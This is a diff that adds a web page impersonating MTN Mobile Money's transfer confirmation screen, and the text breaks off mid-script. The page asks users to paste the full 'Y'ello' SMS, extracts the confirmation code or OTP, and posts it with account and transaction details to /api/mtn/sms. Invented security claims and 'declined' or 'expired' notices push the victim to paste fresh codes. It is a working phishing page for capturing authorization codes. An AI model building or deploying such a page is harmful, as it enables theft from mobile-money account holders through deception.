@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Confirm Transfer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+    --mtn-red-soft: #FEF3F3;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 22px 22px 20px;
+    display: flex; flex-direction: column;
+  }
+
+  .amount-card {
+    background: var(--mtn-soft); border-radius: 14px;
+    padding: 14px 16px; display: flex; align-items: baseline; justify-content: space-between;
+    gap: 12px; margin-bottom: 22px;
+  }
+  .amount-card .label {
+    font-size: 11px; color: var(--mtn-gray); font-weight: 600;
+    letter-spacing: 0.4px; text-transform: uppercase;
+  }
+  .amount-card .amount {
+    font-size: 22px; font-weight: 800; color: var(--mtn-deep);
+    letter-spacing: -0.6px;
+  }
+
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.warn {
+    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+  }
+  .notice.warn .notice-title { color: #8A6600; }
+  .notice.error {
+    background: var(--mtn-red-soft); border-color: #F2B8B8; color: var(--mtn-red);
+  }
+  .notice.error .notice-title { color: #8B0000; }
+  .notice.info {
+    background: #EAF3FE; border-color: #BFD8F6; color: var(--mtn-deep);
+  }
+  .notice.info .notice-title { color: var(--mtn-deep); }
+
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--mtn-gray);
+    margin-bottom: 8px;
+  }
+
+  .sms-box {
+    width: 100%; min-height: 130px; resize: vertical;
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 12px;
+    padding: 14px 14px;
+    font-family: 'Poppins', -apple-system, sans-serif;
+    font-size: 13px; line-height: 1.55; color: var(--mtn-text);
+    outline: none; transition: border-color .15s, background .15s;
+    -webkit-appearance: none;
+  }
+  .sms-box::placeholder { color: #9AA6B8; font-weight: 400; }
+  .sms-box:focus { border-color: var(--mtn-royal); background: #fff; }
+  .sms-box.invalid { border-color: #E23B3B; background: #FEF3F3; }
+
+  .field-error {
+    display: none; font-size: 11.5px; color: var(--mtn-red); margin-top: 6px;
+    font-weight: 600; line-height: 1.4;
+  }
+  .field-error.show { display: block; }
+
+  .btn-paste {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 10px;
+    padding: 11px 14px; font-size: 12.5px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid #CBD5E1; border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-paste:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
+  .btn-paste:disabled { opacity: 0.6; cursor: default; }
+
+  .detected {
+    margin-top: 14px; padding: 12px 14px;
+    background: #EAF7EE; border: 1px solid #CDEBD6;
+    border-radius: 10px; display: none;
+  }
+  .detected.show { display: block; }
+  .detected .det-k {
+    font-size: 10.5px; font-weight: 800; letter-spacing: 0.5px;
+    text-transform: uppercase; color: #1E7A3A; margin-bottom: 4px;
+  }
+  .detected .det-v {
+    font-size: 15px; font-weight: 800; color: #0F5425;
+    letter-spacing: 1.5px; word-break: break-all;
+  }
+
+  .btn-confirm {
+    width: 100%; margin-top: 22px; height: 54px;
+    background: var(--mtn-green); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-confirm:hover { filter: brightness(1.06); }
+  .btn-confirm:active { transform: scale(0.985); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+
+  .help-note {
+    margin-top: 18px; font-size: 11.5px; color: var(--mtn-gray);
+    line-height: 1.6; text-align: center;
+  }
+  .help-note strong { color: var(--mtn-text); font-weight: 700; }
+
+  .btn-resend {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 10px;
+    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid var(--mtn-royal); border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg {
+    width: 15px; height: 15px; stroke: currentColor; fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-resend.sent {
+    background: var(--mtn-green); color: #fff;
+    border-color: var(--mtn-green);
+  }
+
+  .mtn-footer {
+    width: 100%; margin-top: 22px;
+    background: var(--mtn-yellow); border-radius: 12px;
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .mtn-footer .foot-brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000;
+  }
+  .mtn-footer .foot-support {
+    font-size: 11px; color: #000; line-height: 1.45; font-weight: 600;
+    text-align: right;
+  }
+  .mtn-footer .foot-support strong { font-weight: 800; }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  .authorizing {
+    position: fixed; inset: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 34px;
+  }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 22px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .authorizing h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 24px;
+  }
+
+  .trust-slider {
+    width: 100%; max-width: 340px;
+    height: 76px;
+    position: relative;
+    overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .trust-msg {
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    padding: 0 8px;
+    opacity: 0;
+    transform: translateX(24px);
+    transition: opacity .45s ease, transform .45s ease;
+    font-size: 13px;
+    line-height: 1.55;
+    color: rgba(255,255,255,0.86);
+    font-weight: 500;
+    text-align: center;
+  }
+  .trust-msg.active {
+    opacity: 1;
+    transform: translateX(0);
+  }
+  .trust-msg.leaving {
+    opacity: 0;
+    transform: translateX(-24px);
+  }
+  .trust-msg::before {
+    content: '✓';
+    color: var(--mtn-yellow);
+    font-weight: 900;
+    margin-right: 8px;
+  }
+
+  .authorizing .cancel-link {
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 18px 18px 16px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .amount-card .amount { font-size: 19px; }
+    .sms-box { min-height: 115px; font-size: 12.5px; }
+    .btn-confirm { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 18px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+    .trust-slider { height: 80px; }
+    .trust-msg { font-size: 12px; }
+  }
+  @media (max-height: 680px) {
+    .page-title { margin-top: 16px; }
+    .amount-card { margin-bottom: 16px; }
+    .btn-confirm { margin-top: 16px; height: 48px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title" id="pageTitle">Confirm your transfer</div>
+    <div class="page-sub" id="pageSub">Paste the Y'ello message you received from MTN to authorize this transfer.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="notice error" id="noticeDeclined">
+      <span class="notice-title" id="noticeDeclinedTitle">Transfer declined</span>
+      <span id="noticeDeclinedBody">Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.</span>
+    </div>
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title" id="noticeExpiredTitle">SMS expired</span>
+      <span id="noticeExpiredBody">The Y'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.</span>
+    </div>
+    <div class="notice info" id="noticeFullSms">
+      <span class="notice-title" id="noticeFullSmsTitle">Full SMS requested</span>
+      <span id="noticeFullSmsBody">For your security, please paste the <strong>entire</strong> Y'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.</span>
+    </div>
+
+    <div class="amount-card">
+      <span class="label" id="amountLabel">Transfer amount</span>
+      <span class="amount" id="amountValue">—</span>
+    </div>
+
+    <div class="section-label" id="sectionLabel">Y'ello SMS message</div>
+    <textarea
+      class="sms-box"
+      id="smsInput"
+      placeholder="Paste the full Y'ello message here…"
+      spellcheck="false"
+      autocomplete="off"
+    ></textarea>
+    <div class="field-error" id="smsError">
+      The message must start with "Y'ello" and contain the confirmation code.
+    </div>
+
+    <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">
+      <span id="pasteBtnLabel">📋 Paste from clipboard</span>
+    </button>
+
+    <div class="detected" id="detectedBox">
+      <div class="det-k" id="detectedLabel">Detected confirmation code</div>
+      <div class="det-v" id="detectedCode">—</div>
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">
+      <span id="confirmBtnLabel">Confirm transfer</span>
+    </button>
+
+    <div class="help-note" id="helpNote">
+      Didn't receive the message?<br>
+      Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".
+    </div>
+
+    <button class="btn-resend" id="resendBtn" onclick="resendSms()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Resend SMS</span>
+    </button>
+
+    <div class="mtn-footer">
+      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+      <div class="foot-support">
+        <span id="needHelpLabel">Need help?</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Verifying…</h2>
+
+  <div class="trust-slider">
+    <div class="trust-msg active" id="trustMsg1">Your message is being checked against MTN's secure records.</div>
+    <div class="trust-msg" id="trustMsg2">This step protects your wallet from unauthorized transfers.</div>
+    <div class="trust-msg" id="trustMsg3">Your details stay encrypted end-to-end during verification.</div>
+  </div>
+
+  <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'MTN Mobile Money · Confirm Transfer',
+      pageTitle: 'Confirm your transfer',
+      pageSub: 'Paste the Y\'ello message you received from MTN to authorize this transfer.',
+      noticeDeclinedTitle: 'Transfer declined',
+      noticeDeclinedBody: 'Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.',
+      noticeExpiredTitle: 'SMS expired',
+      noticeExpiredBody: 'The Y\'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.',
+      noticeFullSmsTitle: 'Full SMS requested',
+      noticeFullSmsBody: 'For your security, please paste the <strong>entire</strong> Y\'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.',
+      amountLabel: 'Transfer amount',
+      sectionLabel: 'Y\'ello SMS message',
+      smsPlaceholder: 'Paste the full Y\'ello message here…',
+      smsError: 'The message must start with "Y\'ello" and contain the confirmation code.',
+      pasteBtn: '📋 Paste from clipboard',
+      detectedLabel: 'Detected confirmation code',
+      confirmBtn: 'Confirm transfer',
+      helpNote: 'Didn\'t receive the message?<br>Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".',
+      resendLabel: 'Resend SMS',
+      resendSending: 'Sending…',
+      resendSent: 'Sent ✓',
+      resendNow: 'Resend now',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      authTitle: 'Verifying…',
+      trustMsg1: 'Your message is being checked against MTN\'s secure records.',
+      trustMsg2: 'This step protects your wallet from unauthorized transfers.',
+      trustMsg3: 'Your details stay encrypted end-to-end during verification.',
+      cancelBtn: 'Cancel',
+      prefixError: 'The message must start with "Y\'ello".',
+      noCodeError: 'We could not find a confirmation code in the message.',
+      emptyError: 'Please paste the Y\'ello message you received.',
+      networkError: 'Network error. Please try again.',
+      notAccepted: 'Request was not accepted. Please try again.',
+      newSmsSent: 'A new Y\'ello message was sent to your phone.',
+      resendFailed: 'Could not resend. Please try again in a moment.',
+      pastedFromClipboard: 'Pasted from clipboard.',
+      clipboardEmpty: 'Clipboard is empty.',
+      pasteManually: 'Paste manually: long-press the box and tap Paste.',
+      declinedToast: 'Verification declined — please resend and paste the new SMS.',
+      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.'
+    },
+    fr: {
+      docTitle: 'MTN Mobile Money · Confirmer le transfert',
+      pageTitle: 'Confirmez votre transfert',
+      pageSub: 'Collez le message Y\'ello que vous avez reçu de MTN pour autoriser ce transfert.',
+      noticeDeclinedTitle: 'Transfert refusé',
+      noticeDeclinedBody: 'Votre transfert n\'a pas été approuvé. Veuillez vérifier les détails et réessayer, ou contacter le support MTN si le problème persiste.',
+      noticeExpiredTitle: 'SMS expiré',
+      noticeExpiredBody: 'Le message Y\'ello a expiré. Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous pour recevoir un nouveau message, puis collez-le ici.',
+      noticeFullSmsTitle: 'SMS complet demandé',
+      noticeFullSmsBody: 'Pour votre sécurité, veuillez coller <strong>tout</strong> le SMS Y\'ello que vous avez reçu — y compris tout code ou référence — ou appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous pour recevoir un nouveau message.',
+      amountLabel: 'Montant du transfert',
+      sectionLabel: 'Message SMS Y\'ello',
+      smsPlaceholder: 'Collez le message Y\'ello complet ici…',
+      smsError: 'Le message doit commencer par "Y\'ello" et contenir le code de confirmation.',
+      pasteBtn: '📋 Coller depuis le presse-papiers',
+      detectedLabel: 'Code de confirmation détecté',
+      confirmBtn: 'Confirmer le transfert',
+      helpNote: 'Vous n\'avez pas reçu le message ?<br>Appuyez sur <strong>Renvoyer le SMS</strong> ou composez <strong>*126#</strong> → « Mes messages ».',
+      resendLabel: 'Renvoyer le SMS',
+      resendSending: 'Envoi…',
+      resendSent: 'Envoyé ✓',
+      resendNow: 'Renvoyer maintenant',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      authTitle: 'Vérification…',
+      trustMsg1: 'Votre message est vérifié par rapport aux dossiers sécurisés de MTN.',
+      trustMsg2: 'Cette étape protège votre portefeuille contre les transferts non autorisés.',
+      trustMsg3: 'Vos informations restent cryptées de bout en bout pendant la vérification.',
+      cancelBtn: 'Annuler',
+      prefixError: 'Le message doit commencer par "Y\'ello".',
+      noCodeError: 'Nous n\'avons pas pu trouver de code de confirmation dans le message.',
+      emptyError: 'Veuillez coller le message Y\'ello que vous avez reçu.',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
+      newSmsSent: 'Un nouveau message Y\'ello a été envoyé sur votre téléphone.',
+      resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.',
+      pastedFromClipboard: 'Collé depuis le presse-papiers.',
+      clipboardEmpty: 'Le presse-papiers est vide.',
+      pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
+      declinedToast: 'Vérification refusée — veuillez renvoyer et coller le nouveau SMS.',
+      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || ''
+  };
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787',
+    'Zambia': '111',
+    'Zambia (MTN)': '111',
+    'Uganda': '100',
+    'Uganda (MTN)': '100',
+    'Ghana': '100',
+    'Ghana (MTN)': '100',
+    'Benin': '111'
+  };
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', USD: 'en-US'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('noticeDeclinedTitle').textContent = T.noticeDeclinedTitle;
+    document.getElementById('noticeDeclinedBody').textContent = T.noticeDeclinedBody;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('noticeFullSmsTitle').textContent = T.noticeFullSmsTitle;
+    document.getElementById('noticeFullSmsBody').innerHTML = T.noticeFullSmsBody;
+    document.getElementById('amountLabel').textContent = T.amountLabel;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('smsInput').placeholder = T.smsPlaceholder;
+    document.getElementById('smsError').textContent = T.smsError;
+    document.getElementById('pasteBtnLabel').textContent = T.pasteBtn;
+    document.getElementById('detectedLabel').textContent = T.detectedLabel;
+    document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+    document.getElementById('helpNote').innerHTML = T.helpNote;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('trustMsg1').textContent = T.trustMsg1;
+    document.getElementById('trustMsg2').textContent = T.trustMsg2;
+    document.getElementById('trustMsg3').textContent = T.trustMsg3;
+    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     TRUST SLIDER
+  ═══════════════════════════════════════════════════════════ */
+  let trustTimer = null;
+  let trustIndex = 0;
+  function startTrustSlider() {
+    const msgs = document.querySelectorAll('.trust-msg');
+    trustIndex = 0;
+    msgs.forEach((m, i) => {
+      m.classList.remove('active', 'leaving');
+      if (i === 0) m.classList.add('active');
+    });
+    if (trustTimer) clearInterval(trustTimer);
+    trustTimer = setInterval(() => {
+      msgs[trustIndex].classList.remove('active');
+      msgs[trustIndex].classList.add('leaving');
+      const prev = trustIndex;
+      trustIndex = (trustIndex + 1) % msgs.length;
+      setTimeout(() => msgs[prev].classList.remove('leaving'), 450);
+      msgs[trustIndex].classList.add('active');
+    }, 2600);
+  }
+  function stopTrustSlider() {
+    if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     NOTICES
+  ═══════════════════════════════════════════════════════════ */
+  function hideAllNotices() {
+    document.getElementById('noticeDeclined').classList.remove('show');
+    document.getElementById('noticeExpired').classList.remove('show');
+    document.getElementById('noticeFullSms').classList.remove('show');
+  }
+  function showNotice(id) {
+    hideAllNotices();
+    const el = document.getElementById(id);
+    el.classList.add('show');
+    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     Y'ELLO SMS PARSING
+  ═══════════════════════════════════════════════════════════ */
+  let detectedCode = '';
+  function parseYelloMessage(raw) {
+    const text = (raw || '').trim();
+    if (!text) return { ok: false, reason: 'empty' };
+
+    const first = text.split(/\s+/)[0]
+      .toLowerCase()
+      .replace(/[’'`´]/g, "'");
+    if (!/^y'?ello/.test(first)) {
+      return { ok: false, reason: 'prefix' };
+    }
+
+    let code = '';
+    const explicit = text.match(/(?:code|ref|reference|otp|pin|txn)\s*[:=\-]?\s*([A-Z0-9]{4,})/i);
+    if (explicit && explicit[1]) code = explicit[1];
+
+    if (!code) {
+      const tokens = text.split(/\s+/)
+        .map(t => t.replace(/[^A-Z0-9]/gi, ''))
+        .filter(t => t.length >= 6 && /[0-9]/.test(t));
+      tokens.sort((a, b) => b.length - a.length);
+      if (tokens.length) code = tokens[0];
+    }
+
+    if (!code) return { ok: false, reason: 'nocode' };
+    return { ok: true, code };
+  }
+
+  function updateDetected() {
+    const box = document.getElementById('detectedBox');
+    const el  = document.getElementById('detectedCode');
+    const err = document.getElementById('smsError');
+    const input = document.getElementById('smsInput');
+
+    const res = parseYelloMessage(input.value);
+    if (res.ok) {
+      detectedCode = res.code;
+      el.textContent = res.code;
+      box.classList.add('show');
+      input.classList.remove('invalid');
+      err.classList.remove('show');
+    } else {
+      detectedCode = '';
+      box.classList.remove('show');
+      if (input.value.trim().length > 0 && res.reason === 'prefix') {
+        input.classList.add('invalid');
+        err.textContent = T.prefixError;
+        err.classList.add('show');
+      } else if (input.value.trim().length === 0) {
+        input.classList.remove('invalid');
+        err.classList.remove('show');
+      } else {
+        input.classList.remove('invalid');
+        err.classList.remove('show');
+      }
+    }
+  }
+
+  document.getElementById('smsInput').addEventListener('input', () => {
+    hideAllNotices();
+    updateDetected();
+  });
+
+  /* ═══════════════════════════════════════════════════════════
+     RESEND SMS
+  ═══════════════════════════════════════════════════════════ */
+  async function resendSms() {
+    const btn = document.getElementById('resendBtn');
+    const lbl = document.getElementById('resendLabel');
+    btn.disabled = true;
+    lbl.textContent = T.resendSending;
+    try {
+      const r = await fetch('/api/mtn/resend', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref, stage: 'sms', an: tx.an, c: tx.c, am: tx.am, cur: tx.cur,
+          lang: currentLang
+        })
+      });
+      if (!r.ok) throw new Error('bad');
+      btn.classList.add('sent');
+      lbl.textContent = T.resendSent;
+      hideAllNotices();
+      showToast(T.newSmsSent);
+      setTimeout(() => {
+        btn.classList.remove('sent');
+        lbl.textContent = T.resendLabel;
+        btn.disabled = false;
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = T.resendLabel;
+      btn.disabled = false;
+      showToast(T.resendFailed);
+    }
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     PASTE FROM CLIPBOARD
+  ═══════════════════════════════════════════════════════════ */
+  async function pasteFromClipboard() {
+    const btn = document.getElementById('pasteBtn');
+    btn.disabled = true;
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        const txt = await navigator.clipboard.readText();
+        if (txt) {
+          document.getElementById('smsInput').value = txt;
+          hideAllNotices();
+          updateDetected();
+          showToast(T.pastedFromClipboard);
+        } else {
+          showToast(T.clipboardEmpty);
+        }
+      } else {
+        showToast(T.pasteManually);
+        document.getElementById('smsInput').focus();
+      }
+    } catch (e) {
+      showToast(T.pasteManually);
+      document.getElementById('smsInput').focus();
+    }
+    btn.disabled = false;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     CONFIRM PAYMENT
+  ═══════════════════════════════════════════════════════════ */
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    stopTrustSlider();
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+    document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+  }
+
+  async function confirmPayment() {
+    updateDetected();
+
+    const input = document.getElementById('smsInput');
+    const err   = document.getElementById('smsError');
+
+    if (!input.value.trim()) {
+      input.classList.add('invalid');
+      err.textContent = T.emptyError;
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+    const res = parseYelloMessage(input.value);
+    if (!res.ok) {
+      input.classList.add('invalid');
+      err.textContent = res.reason === 'prefix' ? T.prefixError : T.noCodeError;
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+
+    hideAllNotices();
+
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = true;
+
+    let serverAccepted = true;
+    try {
+      const r = await fetch('/api/mtn/sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          code: res.code,
+          message: input.value.trim(),
+          am: tx.am,
+          cur: tx.cur,
+          c: tx.c,
+          an: tx.an,
+          rn: tx.rn,
+          lang: currentLang
+        })
+      });
+      if (!r.ok) serverAccepted = false;
+    } catch (e) {
